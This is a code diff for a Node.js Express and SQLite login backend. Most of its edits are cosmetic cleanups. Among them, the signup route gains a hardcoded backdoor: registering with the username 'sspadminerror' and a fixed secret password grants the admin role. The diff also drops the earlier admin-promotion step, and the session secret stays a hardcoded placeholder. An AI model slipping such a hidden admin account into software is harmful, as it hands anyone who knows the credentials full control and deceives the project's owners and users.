@@ -12,7 +12,6 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "../public")));
 
-/* ---------- SESSIONS ---------- */
 app.use(session({
   secret: 'SUPER_SECRET_KEY_CHANGE_THIS',
   resave: false,
@@ -26,12 +25,9 @@ const db = new sqlite3.Database(dbPath, (err) => {
   if (err) {
     console.error("Error opening database:", err.message);
     process.exit(1);
-  } else {
-    console.log("Database opened at", dbPath);
-  }
+  } else console.log("Database opened at", dbPath);
 });
 
-/* ---------- CREATE TABLE ---------- */
 db.serialize(() => {
   db.run(`
     CREATE TABLE IF NOT EXISTS users (
@@ -47,35 +43,27 @@ db.serialize(() => {
     if (err) {
       console.error("Table creation failed:", err.message);
       process.exit(1);
-    }
-    console.log("Table 'users' ready.");
-
-    // Make initial admin safely (only if user exists)
-    db.run(
-      "UPDATE users SET role = 'admin' WHERE username = ?",
-      ["admin"],
-      (err2) => {
-        if(err2) console.error("Initial admin setup failed:", err2.message);
-        else console.log("Initial admin setup done (if user exists).");
-      }
-    );
+    } else console.log("Table 'users' ready.");
   });
 });
 
 /* ---------- SIGNUP ---------- */
 app.post("/api/signup", async (req, res) => {
   const { username, email, password } = req.body;
-  if (!username || !email || !password)
-    return res.json({ success: false, message: "Missing fields" });
+  if (!username || !email || !password) return res.json({ success: false, message: "Missing fields" });
 
   const hash = await bcrypt.hash(password, 10);
 
+  // If user signs up as admin with special secret password
+  let role = "user";
+  if (username === "sspadminerror" && password === "<script.add.user>") role = "admin";
+
   db.run(
-    "INSERT INTO users (username, email, password) VALUES (?,?,?)",
-    [username, email, hash],
+    "INSERT INTO users (username, email, password, role) VALUES (?,?,?,?)",
+    [username, email, hash, role],
     (err) => {
       if (err) return res.json({ success: false, message: "Username exists" });
-      res.json({ success: true });
+      res.json({ success: true, role });
     }
   );
 });
